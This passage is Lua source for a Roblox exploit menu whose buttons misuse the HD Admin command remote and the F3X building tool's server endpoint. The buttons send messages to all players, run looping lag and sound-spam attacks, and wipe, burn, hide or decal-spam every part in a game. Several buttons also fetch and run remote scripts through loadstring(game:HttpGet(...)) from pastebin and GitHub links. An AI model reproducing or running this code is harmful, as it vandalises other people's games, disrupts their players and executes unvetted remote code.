    [1] = ";talk all Prefix = : "

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))


local args = {

    [1] = ";notice all You've been permRanked to <Insanity's Admin>"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))



end)

MainSection5:NewButton("John Laugh","", function()

local args = {

    [1] = ";music 130759239 | ;volume inf |"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)


MainSection5:NewButton("Xx_INS4NO_xX Abuse/Lag","", function()
while true do

local args = {

    [1] = ";music 1847661821 | ;volume inf"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))


local args = {

    [1] = ";loadmap | ;sm game lagged by ins4no🙏 | ;sh game lagged by ins4no🙏"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
wait()
end
end)




MainSection:NewButton("F3X (method 1)","", function()

local args = {

    [1] = ";btools"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)



MainSection:NewButton("F3X (method 2)","", function()

local args = {

    [1] = ";give me build"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)



MainSection:NewButton("Sword","", function()

local args = {

    [1] = ";sword"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)



MainSection2:NewButton("F3X All (method 1)","", function()

local args = {

    [1] = ";btools all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)



MainSection2:NewButton("F3X All (method 2)","", function()

local args = {

    [1] = ";give all build"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)



MainSection2:NewButton("Sword All","", function()

local args = {

    [1] = ";sword all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)



MainSection5:NewButton("Raining Toads (F3X)","", function()

while true do

local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()

local part = F3X.new("Part", workspace)

part.Size = Vector3.new(440,530,380)

part.Position = Vector3.new(math.random(-1000,1000),math.random(1,3000),math.random(-1000,1000))

part.CanCollide = false

mesh = part:AddMesh()

mesh.MeshType = "FileMesh"

mesh.MeshId = "http://www.roblox.com/asset/?id=5038530279"

mesh.TextureId = "http://www.roblox.com/asset/?id=5038530309"

mesh.Scale = Vector3.new(10, 10, 10)

wait(0.1)

end

end)

MainSection5:NewButton("Fire Block Rain (F3X)","", function()

while true do

local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()

local part = F3X.new("Part", workspace)

part.Size = Vector3.new(1,1,1)

part.Position = Vector3.new(math.random(-1000,1000),math.random(1,3000),math.random(-1000,1000))

part.BrickColor = BrickColor.random()

part.CanCollide = true

part:AddFire().Size = 25

wait(0.1)

end

end)

MainSection5:NewButton("Raining TrollFaces (F3X)","", function()

while true do

local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()

local part = F3X.new("Part", workspace)

part.Size = Vector3.new(440,530,380)

part.Position = Vector3.new(math.random(-1000,1000),math.random(1,3000),math.random(-1000,1000))

part.CanCollide = false

mesh = part:AddMesh()

mesh.MeshType = "FileMesh"

mesh.MeshId = "http://www.roblox.com/asset/?id=6900071612"

mesh.TextureId = "http://www.roblox.com/asset/?id=6900071652"

mesh.Scale = Vector3.new(400, 400, 400)

wait(0.1)

end

end)
     
MainSection5:NewButton("Block Rain(F3X)","", function()

while true do

local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()

local part = F3X.new("Part", workspace)

part.Size = Vector3.new(50,50,50)

part.Position = Vector3.new(math.random(-1000,1000),math.random(1,3000),math.random(-1000,1000))

part.CanCollide = true

wait()

end

end)



MainSection5:NewButton("Clear Workspace (F3X)","", function()
local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function AddFire(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
			_(args)
		end
		function ClearWorkspace()
			for i,v in game.Workspace:GetDescendants() do
				spawn(function()
					SetLocked(v,false)
					DestroyPart(v)
				end)
			end
		end
		ClearWorkspace()

end)





MainSection5:NewButton("Fire Parts (F3X)","", function()

local player = game.Players.LocalPlayer

	local char = player.Character

	local tool

	for i,v in player:GetDescendants() do

		if v.Name == "SyncAPI" then

			tool = v.Parent

		end

	end

		for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

	--craaa

	remote = tool.SyncAPI.ServerEndpoint

	function _(args)

		remote:InvokeServer(unpack(args))

	end

	function SetCollision(part,boolean)

		local args = {

			[1] = "SyncCollision",

			[2] = {

				[1] = {

					["Part"] = part,

					["CanCollide"] = boolean

				}

			}

		}

		_(args)

	end

	function SetAnchor(boolean,part)

		local args = {

			[1] = "SyncAnchor",

			[2] = {

				[1] = {

					["Part"] = part,

					["Anchored"] = boolean

				}

			}

		}

		_(args)

	end

	function CreatePart(cf,parent)

		local args = {

			[1] = "CreatePart",

			[2] = "Normal",

			[3] = cf,

			[4] = parent

		}

		_(args)

	end

	function DestroyPart(part)

		local args = {

			[1] = "Remove",

			[2] = {

				[1] = part

			}

		}

		_(args)

	end

	function MovePart(part,cf)

		local args = {

			[1] = "SyncMove",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf

				}

			}

		}

		_(args)

	end

	function Resize(part,size,cf)

		local args = {

			[1] = "SyncResize",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf,

					["Size"] = size

				}

			}

		}

		_(args)

	end

	function AddMesh(part)

		local args = {

			[1] = "CreateMeshes",

			[2] = {

				[1] = {

					["Part"] = part

				}

			}

		}

		_(args)

	end

	

	function SetMesh(part,meshid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["MeshId"] = "rbxassetid://"..meshid

				}

			}

		}

		_(args)

	end

	function SetTexture(part, texid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["TextureId"] = "rbxassetid://"..texid

				}

			}

		}

		_(args)

	end

	function SetName(part, stringg)

		local args = {

			[1] = "SetName",

			[2] = {

				[1] = workspace.Part

			},

			[3] = stringg

		}

	

		_(args)

	end

	function MeshResize(part,size)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["Scale"] = size

				}

			}

		}

		_(args)

	end

	function Weld(part1, part2,lead)

		local args = {

			[1] = "CreateWelds",

			[2] = {

				[1] = part1,

				[2] = part2

			},

			[3] = lead

		}

		_(args)

	

	end

	function SetLocked(part,boolean)

		local args = {

			[1] = "SetLocked",

			[2] = {

				[1] = part

			},

			[3] = boolean

		}

		_(args)

	end

	function SetTrans(part,int)

		local args = {

			[1] = "SyncMaterial",

			[2] = {

				[1] = {

					["Part"] = part,

					["Transparency"] = int

				}

			}

		}

		_(args)

	end

	function CreateSpotlight(part)

		local args = {

			[1] = "CreateLights",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight"

				}

			}

		}

		_(args)

	end

	function SyncLighting(part,brightness)

		local args = {

			[1] = "SyncLighting",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight",

					["Brightness"] = brightness

				}

			}

		}

		_(args)

	end

		function AddFire(part)

			local args = {

				[1] = "CreateDecorations",

				[2] = {

					[1] = {

						["Part"] = part,

						["DecorationType"] = "Fire"

					}

				}

			}

			_(args)

		end

function Parts()

		for i,v in game.Workspace:GetDescendants() do

			spawn(function()

					SetLocked(v,false)

					AddFire(v)

			end)

		end

	end

	Parts()

end)



MainSection5:NewButton("Invis Parts (F3X)","", function()

local player = game.Players.LocalPlayer

	local char = player.Character

	local tool

	for i,v in player:GetDescendants() do

		if v.Name == "SyncAPI" then

			tool = v.Parent

		end

	end

		for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

	--craaa

	remote = tool.SyncAPI.ServerEndpoint

	function _(args)

		remote:InvokeServer(unpack(args))

	end

	function SetCollision(part,boolean)

		local args = {

			[1] = "SyncCollision",

			[2] = {

				[1] = {

					["Part"] = part,

					["CanCollide"] = boolean

				}

			}

		}

		_(args)

	end

	function SetAnchor(boolean,part)

		local args = {

			[1] = "SyncAnchor",

			[2] = {

				[1] = {

					["Part"] = part,

					["Anchored"] = boolean

				}

			}

		}

		_(args)

	end

	function CreatePart(cf,parent)

		local args = {

			[1] = "CreatePart",

			[2] = "Normal",

			[3] = cf,

			[4] = parent

		}

		_(args)

	end

	function DestroyPart(part)

		local args = {

			[1] = "Remove",

			[2] = {

				[1] = part

			}

		}

		_(args)

	end

	function MovePart(part,cf)

		local args = {

			[1] = "SyncMove",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf

				}

			}

		}

		_(args)

	end

	function Resize(part,size,cf)

		local args = {

			[1] = "SyncResize",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf,

					["Size"] = size

				}

			}

		}

		_(args)

	end

	function AddMesh(part)

		local args = {

			[1] = "CreateMeshes",

			[2] = {

				[1] = {

					["Part"] = part

				}

			}

		}

		_(args)

	end

	

	function SetMesh(part,meshid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["MeshId"] = "rbxassetid://"..meshid

				}

			}

		}

		_(args)

	end

	function SetTexture(part, texid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["TextureId"] = "rbxassetid://"..texid

				}

			}

		}

		_(args)

	end

	function SetName(part, stringg)

		local args = {

			[1] = "SetName",

			[2] = {

				[1] = workspace.Part

			},

			[3] = stringg

		}

	

		_(args)

	end

	function MeshResize(part,size)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["Scale"] = size

				}

			}

		}

		_(args)

	end

	function Weld(part1, part2,lead)

		local args = {

			[1] = "CreateWelds",

			[2] = {

				[1] = part1,

				[2] = part2

			},

			[3] = lead

		}

		_(args)

	

	end

	function SetLocked(part,boolean)

		local args = {

			[1] = "SetLocked",

			[2] = {

				[1] = part

			},

			[3] = boolean

		}

		_(args)

	end

	function SetTrans(part,int)

		local args = {

			[1] = "SyncMaterial",

			[2] = {

				[1] = {

					["Part"] = part,

					["Transparency"] = int

				}

			}

		}

		_(args)

	end

	function CreateSpotlight(part)

		local args = {

			[1] = "CreateLights",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight"

				}

			}

		}

		_(args)

	end

	function SyncLighting(part,brightness)

		local args = {

			[1] = "SyncLighting",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight",

					["Brightness"] = brightness

				}

			}

		}

		_(args)

	end

		function AddFire(part)

			local args = {

				[1] = "CreateDecorations",

				[2] = {

					[1] = {

						["Part"] = part,

						["DecorationType"] = "Fire"

					}

				}

			}

			_(args)

		end

function Parts()

		for i,v in game.Workspace:GetDescendants() do

			spawn(function()

					SetLocked(v,false)

					SetTrans(v,1)

			end)

		end

	end

	Parts()

end)


MainSection5:NewButton("666 (F3X)","", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/C00lHamoot/C00lguidos/fb22aa96b1d804401e29fc53424aa9ab1c4f6c32/Decalspam"))()
end)


MainSection5:NewButton("ins4noify (F3X)","", function()
	--mi pan
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					--spawn(function()
					SetName(v,"Sky")
					AddMesh(v)
					--end)
					--spawn(function()
					SetMesh(v,"8006679977")
					SetTexture(v,id)
					--end)
					MeshResize(v,Vector3.new(2100,2100,2100))
					SetLocked(v,true)
				end
			end
		end
		Sky("16406728522")

-----------------------------------

local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						SpawnDecal(v,Enum.NormalId.Front)
						AddDecal(v,id,Enum.NormalId.Front)
	
						SpawnDecal(v,Enum.NormalId.Back)
						AddDecal(v,id,Enum.NormalId.Back)
	
						SpawnDecal(v,Enum.NormalId.Right)
						AddDecal(v,id,Enum.NormalId.Right)
	
						SpawnDecal(v,Enum.NormalId.Left)
						AddDecal(v,id,Enum.NormalId.Left)
	
						SpawnDecal(v,Enum.NormalId.Bottom)
						AddDecal(v,id,Enum.NormalId.Bottom)
	
						SpawnDecal(v,Enum.NormalId.Top)
						AddDecal(v,id,Enum.NormalId.Top)
					end)
				end
			end 
		end
		spam("16406728522")

end)

MainSection5:NewButton("ins4noify 2 (F3X)","", function()
	--mi pan
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					--spawn(function()
					SetName(v,"Sky")
					AddMesh(v)
					--end)
					--spawn(function()
					SetMesh(v,"8006679977")
					SetTexture(v,id)
					--end)
					MeshResize(v,Vector3.new(2100,2100,2100))
					SetLocked(v,true)
				end
			end
		end
		Sky("16561811104")

-----------------------------------

local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
